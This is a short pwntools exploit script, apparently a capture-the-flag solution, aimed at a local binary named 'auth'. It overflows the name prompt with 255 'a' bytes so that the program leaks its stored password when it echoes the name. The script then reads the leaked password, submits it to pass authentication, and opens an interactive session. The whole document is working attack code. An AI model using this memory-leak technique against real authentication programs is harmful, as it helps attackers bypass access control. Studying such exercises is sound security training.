from pwn import *
# context.log_level = "debug"
p = process("./auth")

p.sendafter("What is your name?" , "a" * (0x100 - 1))
p.recvuntil("a" * 0xff + ",")
password = p.recvuntil("\n" , drop = True)
p.sendline(password)
p.interactive()